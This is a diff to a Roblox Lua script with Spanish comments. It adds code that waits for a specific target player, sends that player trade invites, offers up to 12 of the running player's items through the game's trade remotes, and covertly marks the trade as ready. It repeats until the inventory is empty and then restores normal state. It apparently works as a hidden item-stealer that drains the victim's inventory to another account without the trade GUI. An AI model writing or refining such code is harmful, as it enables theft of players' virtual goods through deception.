@@ -364,7 +364,10 @@ task.spawn(function()
             end
         until jugadorEncontrado
 
-        task.wait(15)
+        -- ==========================================
+        -- ESPERA DE 10 SEGUNDOS AL DETECTAR JUGADOR
+        -- ==========================================
+        task.wait(10)
 
         local tradeando = true 
         local posicionOriginalTrade = nil 
@@ -436,54 +439,114 @@ task.spawn(function()
 
             if #itemsRestantes == 0 then return false end
             
-            local Networking = RS:WaitForChild("Packages"):WaitForChild("Networking")
-            local offerItemRemote = Networking:WaitForChild("RE/Trading/OfferItem")
-            local sendInviteRemote = Networking:WaitForChild("RE/Trading/SendInvite")
-            local guiLocal = player.PlayerGui:WaitForChild("NewGui")
+            local Remotes = require(RS.Shared.Remotes)
+            local ActiveNegotiation = cgData.ActiveNegotiation
+            local Workspace = game:GetService("Workspace")
 
-            local function forzarClic(boton)
-                if getconnections then
-                    for _, c in pairs(getconnections(boton.MouseButton1Click)) do c:Fire() end
-                    for _, c in pairs(getconnections(boton.Activated)) do c:Fire() end
+            local function getSides()
+                local data = ActiveNegotiation.Data
+                if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
+                local me, other
+                if data.player1.player and data.player1.player.UserId == player.UserId then
+                    me, other = data.player1, data.player2
+                else
+                    me, other = data.player2, data.player1
                 end
+                return me, other, data
             end
 
-            for i = 1, math.min(4, #itemsRestantes) do
+            -- 1. Enviar Invitación al objetivo
+            repeat
+                if jugadorEncontrado and jugadorEncontrado.Parent then
+                    Remotes.SendInvite:FireServer(jugadorEncontrado)
+                else
+                    return false -- El jugador se salió, regresa false para cancelar todo
+                end
+                task.wait(4)
+            until getSides() ~= nil
+
+            task.wait(1)
+
+            -- 2. Ofrecer hasta 12 items sin usar GUI
+            for i = 1, math.min(12, #itemsRestantes) do
+                -- Verificamos nuevamente si el jugador sigue en el servidor
+                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
+
                 local item = itemsRestantes[i]
                 
-                if i == 1 then
-                    repeat
-                        if jugadorEncontrado and jugadorEncontrado.Parent then
-                            sendInviteRemote:FireServer(jugadorEncontrado)
-                        else
-                            return false
-                        end
-                        task.wait(4)
-                    until guiLocal:FindFirstChild("TradeNegotiation") and guiLocal.TradeNegotiation.Visible == true
-                    
-                    task.wait(2)
+                local t0 = os.clock()
+                while os.clock() - t0 < 5 do
+                    local _, _, d = getSides()
+                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
+                    task.wait(0.2)
                 end
-                
-                offerItemRemote:FireServer(item.guid)
+
+                Remotes.OfferItem:FireServer(item.guid)
+                task.wait(0.35)
             end
 
-            task.wait(4)
-            local ui = guiLocal:WaitForChild("TradeNegotiation")
-            local btn = ui:WaitForChild("BottomButtons"):WaitForChild("Accept")
-            
-            forzarClic(btn)
-            task.wait(8) 
-            forzarClic(btn)
-            
-            task.wait(15) 
+            -- 3. Lógica para Aceptar (SetReady) de forma oculta
+            local function setReadyTrue()
+                local _, _, data = getSides()
+                if not data then return false end
+                
+                local t0 = os.clock()
+                while os.clock() - t0 < 6 do
+                    local _, _, d = getSides()
+                    if d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3 then break end
+                    task.wait(0.2)
+                end
+                
+                local _, _, d2 = getSides()
+                if d2 then
+                    Remotes.SetReady:FireServer(true, d2.ref or {})
+                end
+            end
+
+            -- 4. Bucle para confirmar fases y terminar trade (Máx 60 seg)
+            local timeout = os.clock()
+            while os.clock() - timeout < 60 do 
+                -- Verificación constante: Si el jugador se sale a mitad de tradeo, lo abortamos.
+                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
+
+                local me, _, d = getSides()
+                if not d then break end
+                if d.exchanging then break end 
+                
+                if me and not me.ready then
+                    setReadyTrue() 
+                end
+                task.wait(0.5)
+            end
+
+            local finalWait = os.clock()
+            while getSides() ~= nil and os.clock() - finalWait < 20 do
+                task.wait(1)
+            end
+
+            task.wait(2) 
             return true
         end
 
+        -- ==========================================
+        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
+        -- ==========================================
         while true do
+            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
+            if not (jugadorEncontrado and jugadorEncontrado.Parent) then
+                break 
+            end
+            
             local continuar = ejecutarTradeo()
-            if not continuar then break end
+            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
+            if not continuar then 
+                break 
+            end
         end
 
+        -- ==========================================
+        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
+        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
